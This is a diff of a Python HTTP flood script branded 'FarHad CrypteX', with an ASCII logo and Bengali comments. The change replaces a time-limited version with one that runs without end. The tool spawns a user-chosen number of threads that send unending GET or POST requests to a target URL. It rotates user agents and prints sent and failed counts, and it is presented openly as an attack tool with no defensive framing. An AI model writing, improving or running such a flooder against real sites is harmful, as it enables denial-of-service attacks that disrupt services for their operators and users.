@@ -1,54 +1,73 @@
 import os
 import sys
-import time
 import threading
-import random
 import requests
-from colorama import Fore, Style, init
+import random
+import time
+from colorama import Fore, init
 
 init(autoreset=True)
 os.system('clear')
 
-# FarHad CrypteX লোগো
-print(Fore.MAGENTA + """
-███████╗ █████╗ ██████╗ ██╗  ██╗ █████╗ ██████╗      ██████╗██████╗ ██╗   ██╗
-██╔════╝██╔══██╗██╔══██╗██║  ██║██╔══██╗██╔══██╗    ██╔════╝██╔══██╗╚██╗ ██╔╝
-███████╗███████║██║  ██║███████║███████║██████╔╝    ██║     ██████╔╝ ╚████╔╝ 
-╚════██║██╔══██║██║  ██║██╔══██║██╔══██║██╔═══╝     ██║     ██╔═══╝   ╚██╔╝  
-███████║██║  ██║██████╔╝██║  ██║██║  ██║██║         ╚██████╗██║        ██║   
-╚══════╝╚═╝  ╚═╝╚═════╝ ╚═╝  ╚═╝╚═╝  ╚═╝╚═╝          ╚═════╝╚═╝        ╚═╝   
+# লোগো
+print(Fore.CYAN + '''
+███████╗ █████╗ ██████╗ ██╗  ██╗ █████╗ ██████╗     ██████╗██████╗ ██╗   ██╗██████╗ ███████╗██╗  ██╗
+██╔════╝██╔══██╗██╔══██╗██║ ██╔╝██╔══██╗██╔══██╗    ██╔════╝██╔══██╗██║   ██║██╔══██╗██╔════╝██║ ██╔╝
+█████╗  ███████║██████╔╝█████╔╝ ███████║██║  ██║    ██║     ██████╔╝██║   ██║██████╔╝█████╗  █████╔╝ 
+██╔══╝  ██╔══██║██╔═══╝ ██╔═██╗ ██╔══██║██║  ██║    ██║     ██╔═══╝ ██║   ██║██╔═══╝ ██╔══╝  ██╔═██╗ 
+██║     ██║  ██║██║     ██║  ██╗██║  ██║██████╔╝    ╚██████╗██║     ╚██████╔╝██║     ███████╗██║  ██╗
+╚═╝     ╚═╝  ╚═╝╚═╝     ╚═╝  ╚═╝╚═╝  ╚═╝╚═════╝      ╚═════╝╚═╝      ╚═════╝ ╚═╝     ╚══════╝╚═╝  ╚═╝
 
-      [FarHad CrypteX] HTTP Flood Attack Tool
-""" + Style.RESET_ALL)
+         FARHAD CRYPTEX - CRX STYLE FLOOD TOOL v1.0
+         Author: Farhad CrypteX | GitHub: osmangani097
+''')
 
-# Usage check
+# আর্গুমেন্ট চেক
 if len(sys.argv) != 4:
-    print("Usage: python3 farhad_crx.py <target_url> <threads> <duration>")
+    print(Fore.YELLOW + "Usage: python3 FarHadCrypteX.py <url> <threads> <method>")
+    print(Fore.YELLOW + "Example: python3 FarHadCrypteX.py https://example.com 300 GET")
     sys.exit()
 
-target = sys.argv[1]
+url = sys.argv[1]
 threads = int(sys.argv[2])
-duration = int(sys.argv[3])
+method = sys.argv[3].upper()
 
 user_agents = [
     "Mozilla/5.0 (Windows NT 10.0; Win64; x64)",
-    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7)",
     "Mozilla/5.0 (X11; Linux x86_64)",
+    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7)",
     "Mozilla/5.0 (iPhone; CPU iPhone OS 14_2 like Mac OS X)"
 ]
 
+success = 0
+failed = 0
 start_time = time.time()
 
-def flood():
-    while time.time() - start_time < duration:
+def attack():
+    global success, failed
+    while True:
         try:
             headers = {'User-Agent': random.choice(user_agents)}
-            response = requests.get(target, headers=headers)
-            print(Fore.GREEN + f"[FarHad CrypteX] Sent: {response.status_code}")
+            if method == "GET":
+                r = requests.get(url, headers=headers, timeout=5)
+            elif method == "POST":
+                r = requests.post(url, headers=headers, data={'data': 'FarhadCrypteX'}, timeout=5)
+            else:
+                print(Fore.RED + f"Invalid method: {method}")
+                break
+            success += 1
         except:
-            print(Fore.RED + "[FarHad CrypteX] Request failed.")
+            failed += 1
 
-# Start attack threads
+def stats():
+    while True:
+        time.sleep(3)
+        uptime = int(time.time() - start_time)
+        print(Fore.GREEN + f"[+] Sent: {success} | [-] Failed: {failed} | Uptime: {uptime}s")
+
+# চালু করা হচ্ছে
+print(Fore.CYAN + f"[!] Launching attack on {url} using {threads} threads with {method} method.\n")
+threading.Thread(target=stats).start()
+
 for _ in range(threads):
-    t = threading.Thread(target=flood)
-    t.start()
+    threading.Thread(target=attack).start()
